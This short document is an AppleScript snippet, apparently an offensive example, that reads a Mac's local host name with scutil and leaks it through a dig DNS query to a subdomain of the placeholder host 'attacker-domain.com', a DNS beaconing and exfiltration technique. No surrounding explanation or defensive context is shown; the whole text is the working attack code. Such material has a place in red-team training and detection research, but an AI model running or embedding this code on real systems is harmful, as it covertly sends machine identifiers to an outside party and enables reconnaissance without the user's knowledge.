set beacon to do shell script "scutil --get LocalHostName"
do shell script "dig " & beacon & ".online.attacker-domain.com"
